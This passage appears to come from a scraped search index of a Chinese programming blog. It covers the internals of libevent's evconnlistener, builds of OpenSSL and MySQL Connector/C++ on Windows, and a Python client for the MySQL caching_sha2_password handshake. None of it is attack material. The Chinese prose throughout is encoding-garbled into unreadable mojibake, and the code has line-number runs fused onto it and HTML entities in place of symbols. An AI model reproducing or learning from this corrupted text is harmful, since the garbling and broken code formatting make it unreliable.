sin.sin_port=htons(port); listener=evconnlistener_new_bind(base,//event_base accept_conn_cb,//cb NULL,// ptr LEV_OPT_CLOSE_ON_FREE|LEV_OPT_REUSEABLE,//flag -1,//backlog (struct sockaddr*)&amp;sin, sizeof(sin)); assert(listener!=NULL); evconnlistener_set_error_cb(listener,accept_error_cb); event_base_dispatch(base); return 0;&#125; ï¼ˆä¸‰ï¼‰æºç  çœ‹çœ‹evconnlistenråšäº†å“ªäº›å°è£… 3.1ç»“æ„ä½“ 1234567891011121314struct evconnlistener &#123; const struct evconnlistener_ops *ops; //ä¸€äº›å›è°ƒå‡½æ•° void *lock; evconnlistener_cb cb;// evconnlistener_errorcb errorcb; void *user_data;// unsigned flags; short refcnt; unsigned enabled : 1;&#125;;struct evconnlistener_event &#123; struct evconnlistener base; struct event listener;&#125;; evconnlistenerç»“æ„ä½“å°†ä¸€äº›åŸºæœ¬çš„å›è°ƒå‡½æ•°ã€ç”¨æˆ·æ•°æ®ç­‰å°è£…ï¼Œç„¶åevconnlistener_eventå°†è¿™äº›ä¸œè¥¿å’Œstruct eventå°è£…åœ¨ä¸€èµ· 3.2åˆ›å»ºä¸€ä¸ªevconnlistener çœ‹ä¸€ä¸‹åˆå§‹åŒ–æœ‰å“ªäº›å†…å®¹ï¼š 1234567891011121314151617181920212223242526272829303132333435struct evconnlistener *evconnlistener_new(struct event_base *base, evconnlistener_cb cb, void *ptr, unsigned flags, int backlog, evutil_socket_t fd)&#123; struct evconnlistener_event *lev; if (backlog &gt; 0) &#123; if (listen(fd, backlog) &lt; 0)//è°ƒç”¨listen return NULL; &#125; else if (backlog &lt; 0) &#123; if (listen(fd, 128) &lt; 0) return NULL; &#125; lev = mm_calloc(1, sizeof(struct evconnlistener_event)); if (!lev) return NULL; //lev-&gt;baseæ˜¯ä¸€ä¸ªevconnlistenerç»“æ„ä½“ lev-&gt;base.ops = &amp;evconnlistener_event_ops;//è®¾ç½®opså‚æ•° lev-&gt;base.cb = cb;//è®¾ç½®å›è°ƒ lev-&gt;base.user_data = ptr;//ptr lev-&gt;base.flags = flags;//flag lev-&gt;base.refcnt = 1; if (flags &amp; LEV_OPT_THREADSAFE) &#123; EVTHREAD_ALLOC_LOCK(lev-&gt;base.lock, EVTHREAD_LOCKTYPE_RECURSIVE); &#125; //å°†fdå…³è”åˆ°struct eventä¸Šå» lev-&gt;listeneræ˜¯struct eventç»“æ„ä½“ //è¿™æ ·assighå°†listener_read_cbè®¾ç½®åˆ°eventçš„cbä¸­ï¼Œå¹¶å°†struct evconnlistneråšä¸ºå‚æ•° //è¿™æ˜¯ä¸€ä¸ªæ¯”è¾ƒå¤æ‚çš„è¿‡ç¨‹ï¼Œé¦–å…ˆç”±äºeventæ¿€æ´»ï¼Œå°†å…ˆè°ƒç”¨listener_read_cb //åœ¨listener_read_cbé€šè¿‡ä¼ å…¥çš„struct evconnlistnerè°ƒç”¨ç”¨æˆ·è‡ªå®šä¹‰å›è°ƒ event_assign(&amp;lev-&gt;listener, base, fd, EV_READ|EV_PERSIST, listener_read_cb, lev); //è¿™é‡Œåº•å±‚è°ƒç”¨event_enable evconnlistener_enable(&amp;lev-&gt;base); return &amp;lev-&gt;base;&#125; åœ¨å¦å¤–ä¸€ä¸ªæ¥å£evconnlistener_new_bindä¸­ç”±äºæŒ‡å®šäº†å¥—æ¥å­—ç»“æ„ä½“ï¼Œå› æ­¤åœ¨åº•å±‚è¿˜è°ƒç”¨äº†bind 3.3 listener_read_cb è¿™ä¸ªåº•å±‚çš„å›è°ƒå‡½æ•°å…ˆäºç”¨æˆ·å›è°ƒå‡½æ•°è°ƒç”¨ï¼Œåœ¨è¿™ä¸ªå›è°ƒä¸­ä¼šè°ƒç”¨ç”¨æˆ·å›è°ƒï¼Œå¹¶ä¸”ä¼šå°†å·²è¿æ¥çš„å¥—æ¥å­—ä½œä¸ºå‚æ•°ä¼ å…¥ç”¨æˆ·å›è°ƒï¼Œ è¿™ä¹Ÿæ­£æ˜¯evconnlistenerçš„ç²¾é«“ï¼Œæ— éœ€è¦ç”¨æˆ·è¿›è¡Œlistenã€bindã€acceptç­‰æ“ä½œ 123456789101112131415161718192021222324252627282930313233343536373839404142static voidlistener_read_cb(evutil_socket_t fd, short what, void *p)&#123; struct evconnlistener *lev = p; int err; evconnlistener_cb cb; evconnlistener_errorcb errorcb; void *user_data; LOCK(lev); while (1) &#123; struct sockaddr_storage ss; socklen_t socklen = sizeof(ss); evutil_socket_t new_fd = accept(fd, (struct sockaddr*)&amp;ss, &amp;socklen);//accept if (new_fd &lt; 0) break; if (socklen == 0) &#123; /* This can happen with some older linux kernels in * response to nmap. */ evutil_closesocket(new_fd); continue; &#125; if (!(lev-&gt;flags &amp; LEV_OPT_LEAVE_SOCKETS_BLOCKING)) evutil_make_socket_nonblocking(new_fd);//non blocking if (lev-&gt;cb == NULL) &#123; UNLOCK(lev); return; &#125; ++lev-&gt;refcnt; cb = lev-&gt;cb;//æ‹¿åˆ°ç”¨æˆ·å›è°ƒ user_data = lev-&gt;user_data; UNLOCK(lev); cb(lev, new_fd, (struct sockaddr*)&amp;ss, (int)socklen, user_data);//è°ƒç”¨ç”¨æˆ·å›è°ƒå¹¶å°†connfdä¼ å…¥ç”¨æˆ·å›è°ƒ LOCK(lev); if (lev-&gt;refcnt == 1) &#123; int freed = listener_decref_and_unlock(lev); EVUTIL_ASSERT(freed); return; &#125; --lev-&gt;refcnt; &#125;&#125; ï¼ˆå››ï¼‰å‚è€ƒ 1.libevent programming 2.libevent æ·±å…¥æµ…å‡º","tags":[{"name":"Opensource","slug":"Opensource","permalink":"https://hodlyounger.github.io/tags/Opensource/"},{"name":"libevent","slug":"libevent","permalink":"https://hodlyounger.github.io/tags/libevent/"}],"categories":[{"name":"C_OpenSource","slug":"C-OpenSource","permalink":"https://hodlyounger.github.io/categories/C-OpenSource/"},{"name":"libevent","slug":"C-OpenSource/libevent","permalink":"https://hodlyounger.github.io/categories/C-OpenSource/libevent/"}]},{"title":"rapidjson ä½¿ç”¨æ•´ç†","date":"2023-10-27T01:24:02.420Z","path":"C_OpenSource/ã€RapidJsonã€‘/","text":"æ¦‚è¿°: rapidjsonä½¿ç”¨æ•´ç† RapidJSON: é¦–é¡µ","tags":[{"name":"json","slug":"json","permalink":"https://hodlyounger.github.io/tags/json/"},{"name":"opensource","slug":"opensource","permalink":"https://hodlyounger.github.io/tags/opensource/"}],"categories":[{"name":"C_OpenSource","slug":"C-OpenSource","permalink":"https://hodlyounger.github.io/categories/C-OpenSource/"}]},{"title":"ã€OpenSSLã€‘Windowsä¸‹ç¼–è¯‘OpenSSl 1.1.1","date":"2023-10-27T01:24:02.418Z","path":"C_OpenSource/OpenSSL/ã€OpenSSLã€‘Windowsä¸‹ç¼–è¯‘OpenSSL/","text":"æ¦‚è¿°ï¼š windowsç³»ç»Ÿç¼–è¯‘OpenSSL 1.1.1ç‰ˆæœ¬æ“ä½œæ­¥éª¤ [toc] 0x01ã€ç¼–è¯‘ç¯å¢ƒè¯´æ˜ æ“ä½œç³»ç»Ÿï¼šwin10 ç¼–è¯‘å™¨ï¼švs2017 OpenSSL: 1.1.1W 0x02ã€ä¾èµ–å·¥å…·è¯´æ˜ æ ¹æ®å®˜æ–¹è¯´æ˜ï¼ŒOpenSSLç¼–è¯‘é™¤äº†Visual Studio 2019ä»¥å¤–ï¼Œä¸ºæ–¹ä¾¿ç¼–è¯‘ï¼Œéœ€è¦å®‰è£…Strawberry Perlå’ŒNASMï¼Œä¸‹è½½åœ°å€åˆ†åˆ«å¦‚ä¸‹ï¼š Strawberry Perlï¼šStrawberry Perl for Windows NASMï¼šNASMï¼Œè¿™æ˜¯ä¸€ä¸ªæ±‡ç¼–å™¨ **ç‰¹åˆ«æ³¨æ„ï¼š**Perlå®‰è£…åä¼šè‡ªåŠ¨æ·»åŠ åˆ°ç¯å¢ƒå˜é‡ä¸­ï¼Œè€ŒNASMä¸ä¼šï¼Œä¸€å®šè¦åœ¨ç¯å¢ƒå˜é‡Pathä¸­æ·»åŠ NASM.exeæ‰€åœ¨çš„ç›®å½•ï¼Œå¦åˆ™å¯èƒ½ä¼šå‡ºç°æ„æƒ³ä¸åˆ°çš„é”™è¯¯ã€‚ 0x03ã€ç¼–è¯‘æ­¥éª¤ ä¸‹è½½æºç  ä»Githubä¸­å¯ä»¥ç›´æ¥ä¸‹è½½ï¼šGitHub - openssl/openssl: TLS/SSL and crypto library æˆ–è€…åœ¨ OpenSSL å®˜æ–¹å»ä¸‹è½½ OpenSSL ä¹Ÿå¯ä»¥å‚è€ƒå®˜æ–¹æ–‡æ¡£è¿›è¡Œç¼–è¯‘ï¼šopenssl/NOTES-WINDOWS.md at master Â· openssl/openssl 0x04ã€ç¼–è¯‘ ä½¿ç”¨ç®¡ç†å‘˜æƒé™æ‰“å¼€ vs2017 çš„å¼€å‘äººå‘˜å‘½ä»¤æç¤ºç¬¦ æ‰“å¼€ååˆ‡æ¢åˆ° openssl è§£å‹ç›®å½•ï¼š é…ç½® Perlï¼Œå‚è€ƒå®˜æ–¹æ–‡æ¡£é…ç½® perl Configure VC-WIN32 if you want 32-bit OpenSSL or perl Configure VC-WIN64A if you want 64-bit OpenSSL or perl Configure VC-WIN64-ARM if you want Windows on Arm (win-arm64) OpenSSL or perl Configure VC-WIN64-CLANGASM-ARM if you want Windows on Arm (win-arm64) OpenSSL with assembly support using clang-cl as assembler or perl Configure VC-CLANG-WIN64-CLANGASM-ARM if you want Windows on Arm (win-arm64) OpenSSL using clang-cl as both compiler and assembler or perl Configure VC-WIN32-HYBRIDCRT if you want 32-bit OpenSSL dependent on the Universal CRT or perl Configure VC-WIN64A-HYBRIDCRT if you want 64-bit OpenSSL dependent on the Universal CRT or perl Configure to let Configure figure out the platform ç‰¹åˆ«æ³¨æ„ï¼šâ€“prefixé€‰é¡¹æŒ‡å®šçš„å®‰è£…è·¯å¾„å¿…é¡»æ˜¯ç»å¯¹è·¯å¾„ï¼Œè‹¥ä¸æŒ‡å®šï¼Œåˆ™é»˜è®¤ä¼šå®‰è£…åœ¨C:\\Program Files (x86)\\ä¸‹é¢ï¼Œå¦‚æœä½ ä¸æ˜¯ç”¨ç®¡ç†å‘˜æƒé™æ‰§è¡Œï¼Œåˆ™ä¼šå‡ºç°*Permission Denied* é”™è¯¯ï¼Œåˆ‡è®°ã€‚ 1perl Configure VC-WIN32 --prefix=E:\\OpenSSL # å°†å…¶å®‰è£…åˆ° E:\\OpenSSL ç›®å½• nmake nmake test namke install 0x05ã€ä½¿ç”¨ ä½¿ç”¨æ—¶ï¼Œåœ¨å·¥ç¨‹å¼•å…¥æ–‡ä»¶å’Œåº“æ–‡ä»¶æ·»åŠ  Openssl å®‰è£…ç›®å½•å³å¯ã€‚ 0x06ã€è¡¥å……è¯´æ˜ å¦‚æœè¦ç¼–è¯‘ /mtã€/mtdã€mdd ç­‰ç‰ˆæœ¬ï¼Œåˆ™éœ€è¦ä¿®æ”¹ makefile æ–‡ä»¶ã€‚ ä½¿ç”¨ perl å‘½ä»¤åä¼šç”Ÿæˆ makefile æ–‡ä»¶ã€‚ 1234567perl Configure VC-WIN32 --prefix=D:\\OpenSSL-3.1-Win32-mtd# é™æ€åº“perl Configure VC-WIN32 shared no-asm no-shared --prefix=&quot;D:\\OpenSSL-Static\\mtd&quot;# Debug ç‰ˆæœ¬perl Configure debug-VC-WIN32 shared no-asm no-shared --prefix=&quot;D:\\OpenSSL-Static\\mtd&quot; makefile æ–‡ä»¶ä¿®æ”¹ CNF_CFLAGS é…ç½®ï¼Œå¦‚ä¸‹æ‰€ç¤ºï¼š 123456CNF_ASFLAGS=-f win32CNF_CPPFLAGS=-D&quot;OPENSSL_SYS_WIN32&quot; -D&quot;WIN32_LEAN_AND_MEAN&quot; -D&quot;UNICODE&quot; -D&quot;_UNICODE&quot; -D&quot;_CRT_SECURE_NO_DEPRECATE&quot; -D&quot;_WINSOCK_DEPRECATED_NO_WARNINGS&quot; -D&quot;OPENSSL_USE_APPLINK&quot; -D&quot;NDEBUG&quot;CNF_CFLAGS=/Gs0 /GF /Gy /MD # ä¿®æ”¹ä¸ºä½ éœ€è¦ç¼–è¯‘çš„æ¨¡å¼ /MD /MDd /MT /MTdCNF_CXXFLAGS=CNF_LDFLAGS=CNF_EX_LIBS=ws2_32.lib gdi32.lib advapi32.lib crypt32.lib user32.lib åœ¨ç¼–è¯‘ä¸€æ¬¡ä¹‹åå¦‚æœéœ€è¦é‡æ–°ç¼–è¯‘ï¼Œåˆ™éœ€è¦æ¸…é™¤ç¼“å­˜ï¼Œæ¸…æ¥šç¼“å­˜å‘½ä»¤ï¼š 1nmake clean è¡¥å…… å®Œæ•´ç¼–è¯‘å¦‚ä¸‹ï¼š 1234567891011121314151617181920perl Configure debug-VC-WIN64A no-asm --prefix=e:\\openssl_x64\\debugnmakenmake install# æŠŠe:\\openssl_x64\\debugæ”¹åä¸ºe:\\openssl_x64\\debug_mdd# å®Œäº†ä¹‹åæŠŠmakefileæ–‡ä»¶ä»¥åŠconfigdata.pmæ–‡ä»¶é‡Œé¢çš„/MDDæ”¹ä¸ºMTDnmake cleannmakenmake install# æŠŠe:\\openssl_x64\\debugæ”¹åä¸ºe:\\openssl_x64\\debug_mtd perl Configure VC-WIN64A no-asm --prefix=e:\\openssl_x64\\releasenmake cleannmakenmake install# æŠŠe:\\openssl_x64\\releaseæ”¹åä¸ºe:\\openssl_x64\\release_md# å®Œäº†ä¹‹åæŠŠmakefileæ–‡ä»¶ä»¥åŠconfigdata.pmæ–‡ä»¶é‡Œé¢çš„/MDæ”¹ä¸ºMTnmake cleannmakenmake install# æŠŠe:\\openssl_x64\\releaseæ”¹åä¸ºe:\\openssl_x64\\release_mt","tags":[{"name":"OpenSource","slug":"OpenSource","permalink":"https://hodlyounger.github.io/tags/OpenSource/"},{"name":"OpenSSL","slug":"OpenSSL","permalink":"https://hodlyounger.github.io/tags/OpenSSL/"}],"categories":[{"name":"C_OpenSource","slug":"C-OpenSource","permalink":"https://hodlyounger.github.io/categories/C-OpenSource/"},{"name":"OpenSSL","slug":"C-OpenSource/OpenSSL","permalink":"https://hodlyounger.github.io/categories/C-OpenSource/OpenSSL/"}]},{"title":"Windowsä¸‹MySQL Connector/C++ 8.1ç¼–è¯‘è¯´æ˜","date":"2023-10-27T01:24:02.417Z","path":"C_OpenSource/MySQL/mysql-connnector-8.0ç¼–è¯‘è¯´æ˜/","text":"æ¦‚è¿°ï¼šæœ¬æ–‡ä¸»è¦è®°å½• MySQL Connector/C++ 8.1 é™æ€åº“çš„ç¼–è¯‘æ–¹å¼ï¼Œå› é¡¹ç›®å·¥ç¨‹é—®é¢˜ï¼Œéœ€è¦ç¼–è¯‘ /MT æ¨¡å¼çš„é™æ€åº“æ–‡ä»¶ã€‚ å®˜æ–¹æ–‡æ¡£ï¼š4.3 ä»æºå®‰è£…è¿æ¥å™¨/C++_MySQL è¿æ¥å™¨/C++ 8.0 å¼€å‘äººå‘˜æŒ‡å— æœ¬æ¬¡ç¼–è¯‘ç›®æ ‡äº§ç‰©ï¼š [x] Debug æ¨¡å¼ä¸‹ /MTd ç¼–è¯‘ é™æ€ç¼–è¯‘ [ ] Release æ¨¡å¼ä¸‹ /MT ç¼–è¯‘ é™æ€ç¼–è¯‘ å‰è¨€ éœ€æ±‚åŠå®˜æ–¹æ–‡ä»¶è¯´æ˜ ç”±äº MySQLå®˜æ–¹å¹¶æ²¡æœ‰æä¾› /MT æ¨¡å¼çš„libæ–‡ä»¶ï¼Œå› æ­¤ç¼–è¯‘æ‰€éœ€è¦çš„é™æ€åº“éƒ½éœ€è¦ä»æºç ç¼–è¯‘ï¼Œé¦–å…ˆè¯´æ˜ä¸€ä¸‹å®˜æ–¹å·²ç¼–è¯‘å¥½çš„æ–‡ä»¶ï¼š åœ¨ MySQL :: MySQL Connector/C++ Developer Guide :: 5.2.1 Windows Notes è¿™é‡Œå¯ä»¥çœ‹åˆ°å®˜æ–¹æä¾›äº† /MD æ¨¡å¼ä¸‹çš„ Debug å’Œ Release é™æ€åº“æ–‡ä»¶ï¼Œä¸‹è½½ä¸ºï¼šMySQL :: Download MySQL Connector/C++ (Archived Versions)ã€‚å…³äºä¸‹è½½åå®‰è£…åŒ…çš„æ–‡ä»¶è¿™æˆ‘è¡¥å……ä¸€ä¸‹ï¼š mysql-connector-c+Â±8.0.33-win32-debugï¼šDebug æ¨¡å¼ä¸‹ /MD çš„ç¼–è¯‘äº§ç‰© mysql-connector-c+Â±8.0.33-win32ï¼šRelease æ¨¡å¼ä¸‹ /MD çš„ç¼–è¯‘äº§ç‰© ä¸¤ä¸ªä¸‹è½½åŒ…çš„æ–‡ä»¶åŸºæœ¬ä¸€è‡´ï¼Œä¸»è¦æ˜¯ä»¥ä¸‹å››ä¸ªæ–‡ä»¶ï¼š mysqlcppconn.lib: ä½¿ç”¨ JDBC+openssl1.1.1 ç‰ˆæœ¬ç¼–è¯‘ mysqlcppconn8.libï¼šä½¿ç”¨ X DEVAPI+openssl1.1.1 ç¼–è¯‘äº§ç‰© mysqlcppconn8-static.libï¼šä½¿ç”¨ X DEVAPI+OpenSSL3.3.1 ç¼–è¯‘äº§ç‰© mysqlcppconn-static.libï¼šä½¿ç”¨ JDBC+OpenSSL3.3.31 ç¼–è¯‘äº§ç‰© ä½¿ç”¨ JDBC å’Œ X DEVAPI çš„åŒ…éœ€è¦ä½¿ç”¨ä¸åŒçš„æ–¹å¼å»è¿æ¥ MySQLï¼Œå…·ä½“ä»£ç å¦‚ä¸‹æ‰€ç¤ºï¼š ä½¿ç”¨ JDBC è¿æ¥ ä»£ç  123456789101112131415161718192021222324252627282930313233343536373839#include &lt;iostream&gt;#include &lt;string&gt;#include &lt;list&gt;#include &lt;cstdlib&gt;#include &lt;mysqlx/xdevapi.h&gt;using namespace mysqlx;#ifdef _DEBUG#pragma comment(lib, &quot;mysqlcppconn8-static-debug-openssl3-mdd.lib&quot;) // ç‰¹æ®Šå‘½åæ ‡è®°äº†ä¸€ä¸‹ï¼Œå®˜æ–¹åº“æ–‡ä»¶ä¸‹ mysqlcppconn8_static.lib#pragma comment(lib, &quot;dnsapi.lib&quot;)#else#pragma comment(lib, &quot;mysqlcppconn8_md.lib&quot;)// ç‰¹æ®Šå‘½åæ ‡è®°äº†ä¸€ä¸‹ï¼Œå®˜æ–¹åº“æ–‡ä»¶ä¸‹ mysqlcppconn8_static.libs#pragma comment(lib, &quot;dnsapi.lib&quot;)#endif // DEBUGint main() &#123; // ä¿®æ”¹æ§åˆ¶å°ç¼–ç  // std::system(&quot;chcp 65001&quot;); try &#123; // æ”¹æˆä½ çš„ä¿¡æ¯b Session sess(SessionOption::USER, &quot;root&quot;, SessionOption::PWD, &quot;123456&quot;, SessionOption::HOST, &quot;localhost&quot;, SessionOption::PORT, 33060, SessionOption::DB, &quot;test&quot;); auto result = sess.sql(&quot;select * from user&quot;).execute(); for (auto row : result.fetchAll()) &#123; std::cout &lt;&lt; row[0] &lt;&lt; &quot; &quot; &lt;&lt; row[1] &lt;&lt; &quot; &quot; &lt;&lt; row[2] &lt;&lt; &quot;\\n&quot;; &#125; &#125; catch (const std::exception&amp; e) &#123; std::cerr &lt;&lt; e.what() &lt;&lt; &#x27;\\n&#x27;; &#125;&#125; é¢„å¤„ç†å™¨ å‚è€ƒå®˜æ–¹è¯´æ˜ï¼šFor applications that use X DevAPI, X DevAPI for C, or (as of Connector/C++ 8.0.16) the legacy JDBC API, define the STATIC_CONCPP macro. All that matters is that you define it; the value does not matter. For example: -DSTATIC_CONCPP ä½¿ç”¨ JDBC è¿æ¥ç¼–è¯‘æ—¶ï¼Œéœ€è¦åœ¨é¢„å¤„ç†å™¨æ·»åŠ  STATIC_CONCPP å®ã€‚ ç‰¹åˆ«çš„ï¼Œå¦‚æœæ‰§è¡Œä»¥ä¸Šæ­¥éª¤ä¹‹åè¿˜æ˜¯ç¼–è¯‘æŠ¥é”™ï¼Œéœ€è¦æ ¹æ®ç›¸å…³æŠ¥é”™ä¿¡æ¯é“¾æ¥å…¶ä»–çš„åº“ã€‚å¦‚ MSCVRT.lib ä½¿ç”¨cmkaeç”Ÿæˆå·¥ç¨‹æ–‡ä»¶ æœ‰å…¶ä»–ç‰¹æ®Šéœ€æ±‚å‚è€ƒå®˜æ–¹è¯´æ˜ï¼šMySQL :: MySQL Connector/C++ Developer Guide :: 4.3 Installing Connector/C++ from Source å®˜æ–¹è¦æ±‚å®‰è£…booståº“ï¼Œå®é™…ç¼–è¯‘ä¸å®‰è£…boostä¹Ÿå¯ä»¥ç¼–è¯‘æˆåŠŸã€‚ ç¼–è¯‘å‘½ä»¤å¦‚ä¸‹æ‰€ç¤ºï¼š 1cmake . -G &quot;Visual Studio 15&quot; -A Win32 -DBUILD_STATIC=ON -DWITH_SSL=&quot;D:\\OpenSSL-3.1-Win32-mtd&quot; -DWITH_JDBC=ON -DWITH_MYSQL=&quot;C:\\Program Files\\MySQL\\MySQL Server 8.0&quot; ç”Ÿæˆ vs2017å·¥ç¨‹ï¼ˆv141å·¥å…·é›†ï¼‰ä¸‹çš„å·¥ç¨‹æ–‡ä»¶ï¼Œäº§ç‰©ä¸ºé™æ€åº“ï¼ŒOpenSSLå®‰è£…ä½ç½®ä¸º &quot;D:\\OpenSSL-3.1-Win32-mtdã€‚è¯´æ˜ï¼š -G â€œVisual Studio 16â€ï¼šæŒ‡å®šå·¥å…·é›† -A Win32 æŒ‡å®šç”Ÿæˆçš„ç³»ç»Ÿ -DBUILD_STATIC=ONï¼šæŒ‡å®šç”Ÿæˆé™æ€åº“ -DWITH_SSL=â€œD:\\OpenSSL-3.1-Win32-mtdâ€ï¼šæŒ‡å®š OpenSSL çš„å®‰è£…ä½ç½® -DWITH_MYSQL=â€œC:\\Program Files\\MySQL\\MySQL Server 8.0â€ï¼šæŒ‡å®š mysqlçš„å®‰è£…ä½ç½® -DWITH_JDBC=ONï¼šæŒ‡å®šç¼–è¯‘JDBC ç”±äºéœ€è¦ /MT ç‰ˆæœ¬çš„ï¼Œå› æ­¤ OpenSSL ä¹Ÿéœ€è¦è‡ªå·±ç¼–è¯‘ /MT ç‰ˆæœ¬çš„æ‰å¯ä»¥ã€‚","tags":[],"categories":[{"name":"C_OpenSource","slug":"C-OpenSource","permalink":"https://hodlyounger.github.io/categories/C-OpenSource/"},{"name":"MySQL","slug":"C-OpenSource/MySQL","permalink":"https://hodlyounger.github.io/categories/C-OpenSource/MySQL/"}]},{"title":"ã€MySQLã€‘caching_sha2_password åŠ å¯†åŸç†å’Œè¿æ¥è¿‡ç¨‹","date":"2023-10-27T01:24:02.413Z","path":"C_OpenSource/MySQL/ã€MySQLã€‘åŠ å¯†åŸç†/","text":"æ¦‚è¿°ï¼šMySQL8 ç‰ˆæœ¬åŠ å¯†åŸç†å’Œè¿æ¥è¿‡ç¨‹è¯´æ˜ å‚è€ƒæ–‡ç« ï¼šMYSQL caching_sha2_password åŠ å¯†åŸç†å’Œè¿æ¥è¿‡ç¨‹(FULL)-è…¾è®¯äº‘å¼€å‘è€…ç¤¾åŒº-è…¾è®¯äº‘ ä½¿ç”¨Pythonè¿æ¥MySQL rsaåŠ å¯†ä½¿ç”¨çš„pymysqlçš„. å› ä¸ºä¸å±äºæœ¬æ–‡çš„å†…å®¹ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247import hashlibimport structimport socketimport os#æ¥è‡ªpymysqlfrom cryptography.hazmat.backends import default_backendfrom cryptography.hazmat.primitives import serialization, hashesfrom cryptography.hazmat.primitives.asymmetric import paddingdef btoint(bdata,t=&#x27;little&#x27;): return int.from_bytes(bdata,t)#æ¥è‡ªpymysqldef _lenenc_int(i): if i &lt; 0: raise ValueError(&quot;Encoding %d is less than 0 - no representation in LengthEncodedInteger&quot; % i) elif i &lt; 0xFB: return bytes([i]) elif i &lt; (1 &lt;&lt; 16): return b&quot;\\xfc&quot; + struct.pack(&quot;&lt;H&quot;, i) elif i &lt; (1 &lt;&lt; 24): return b&quot;\\xfd&quot; + struct.pack(&quot;&lt;I&quot;, i)[:3] elif i &lt; (1 &lt;&lt; 64): return b&quot;\\xfe&quot; + struct.pack(&quot;&lt;Q&quot;, i) else: raise ValueError(&quot;Encoding %x is larger than %x - no representation in LengthEncodedInteger&quot;% (i, (1 &lt;&lt; 64)))#å°±æ˜¯åšä¸ªå¼‚æˆ–#æ¥è‡ªPymysqldef _xor_password(password, salt): salt = bytearray(salt[:20]) password = bytearray(password) for i in range(len(password)): password[i] ^= salt[i%len(salt)] return bytes(password)#æ¥è‡ªpymysqldef sha2_rsa_encrypt(password, salt, public_key): message = _xor_password(password + b&quot;\\0&quot;, salt) rsa_key = serialization.load_pem_public_key(public_key, default_backend()) return rsa_key.encrypt( message, padding.OAEP( mgf=padding.MGF1(algorithm=hashes.SHA1()), algorithm=hashes.SHA1(), label=None, ), )def native_password(password,salt): stage1 = hashlib.sha1(password).digest() stage2 = hashlib.sha1(stage1).digest() rp = hashlib.sha1(salt) rp.update(stage2) result = bytearray(rp.digest()) for x in range(len(result)): result[x] ^= stage1[x] return resultdef sha2_password(password,salt): stage1 = hashlib.sha256(password).digest() stage2 = hashlib.sha256(stage1).digest() stage3 = hashlib.sha256(stage2+salt).digest() result = bytearray(stage3) for x in range(len(result)): result[x] ^= stage1[x] return resultdef parse_handshake(bdata): i = 0 protocol_version = bdata[:1] server_end = bdata.find(b&quot;\\0&quot;, i) i = server_end + 1 thread_id = btoint(bdata[i:i+4]) i += 4 salt = bdata[i:i+8] i += 9 server_capabilities = btoint(bdata[i:i+2]) i += 2 server_charset = btoint(bdata[i:i+1]) i += 1 server_status = btoint(bdata[i:i+2]) i += 2 server_capabilities |= btoint(bdata[i:i+2]) &lt;&lt; 16 i += 2 salt_length = struct.unpack(&#x27;&lt;B&#x27;,bdata[i:i+1])[0] salt_length = max(13,salt_length-8) i += 11 salt += bdata[i:i+salt_length] i += salt_length server_plugname = bdata[i:] return salt class mysql(object): def __init__(self): self.host = &#x27;192.168.101.21&#x27; self.port = 3314 self.user = &#x27;u1&#x27; self.password = &#x27;123456&#x27; def read_pack(self,): pack_header = self.rf.read(4) btrl, btrh, packet_seq = struct.unpack(&quot;&lt;HBB&quot;, pack_header) pack_size = btrl + (btrh &lt;&lt; 16) self._next_seq_id = (self._next_seq_id + 1) % 256 bdata = self.rf.read(pack_size) return bdata def write_pack(self,data): bdata = struct.pack(&quot;&lt;I&quot;, len(data))[:3] + bytes([self._next_seq_id]) + data self.sock.sendall(bdata) self._next_seq_id = (self._next_seq_id + 1) % 256 def handshake(self,bdata): i = 0 #å·²ç»è¯»å–çš„å­—èŠ‚æ•°, è§£æbinlogçš„æ—¶å€™ä¹Ÿæ˜¯è¿™ä¹ˆç”¨çš„..... protocol_version = bdata[:1] #åªè§£æ10 server_end = bdata.find(b&quot;\\0&quot;, i) self.server_version = bdata[i:server_end] i = server_end + 1 self.thread_id = btoint(bdata[i:i+4]) i += 4 self.salt = bdata[i:i+8] i += 9 #è¿˜æœ‰1å­—èŠ‚çš„filter, æ²¡å•¥æ„ä¹‰,å°±ä¸ä¿å­˜äº† self.server_capabilities = btoint(bdata[i:i+2]) i += 2 self.server_charset = btoint(bdata[i:i+1]) i += 1 self.server_status = btoint(bdata[i:i+2]) i += 2 self.server_capabilities |= btoint(bdata[i:i+2]) &lt;&lt; 16 #å¾€å·¦ç§»16ä½ ä¸ºå•¥ä¸æŠŠcapability_flags_1å’Œcapability_flags_2å’Œä¸€èµ·å‘¢ i += 2 salt_length = struct.unpack(&#x27;&lt;B&#x27;,bdata[i:i+1])[0] #æ‡’å¾—å»åˆ¤æ–­capabilities &amp; CLIENT_PLUGIN_AUTHäº† salt_length = max(13,salt_length-8) #å‰é¢å·²ç»æœ‰8å­—èŠ‚äº† i += 1 i += 10 #reserved self.salt += bdata[i:i+salt_length] i += salt_length self.server_plugname = bdata[i:] def HandshakeResponse41(self,): #client_flag = 3842565 #ä¸å«DBname client_flag = 33531525#ä¸å«DBname #client_flag |= 1 &lt;&lt; 3 charset_id = 45 #45:utf8mb4 33:utf8 #bdata = client_flag.to_bytes(4,&#x27;little&#x27;) #å…¶å®åº”è¯¥æœ€ååœ¨åŠ , æ¯•ç«Ÿè¿˜è¦åˆ¤æ–­å¾ˆå¤šå‚æ•°, å¯èƒ½è¿˜éœ€è¦ä¿®æ”¹, ä½†æ˜¯æ‡’ bdata = struct.pack(&#x27;&lt;iIB23s&#x27;,client_flag,2**24-1,charset_id,b&#x27;&#x27;) bdata += self.user.encode() + b&#x27;\\0&#x27; auth_password = native_password(self.password.encode(), self.salt[:20]) auth_response = _lenenc_int(len(auth_password)) + auth_password bdata += auth_response bdata += b&quot;mysql_native_password&quot; + b&#x27;\\0&#x27; #æœ¬æ–‡æœ‰è®¾ç½®è¿æ¥å±æ€§, ä¸»è¦æ˜¯ä¸ºäº†æ–¹ä¾¿è§‚å¯Ÿ attr = &#123;&#x27;_client_name&#x27;:&#x27;ddcw_for_pymysql&#x27;, &#x27;_pid&#x27;:str(os.getpid()), &quot;_client_version&quot;:&#x27;0.0.1&#x27;,&#125; #keyé•¿åº¦+k+vé•¿åº¦+v connect_attrs = b&quot;&quot; for k, v in attr.items(): k = k.encode() connect_attrs += _lenenc_int(len(k)) + k v = v.encode() connect_attrs += 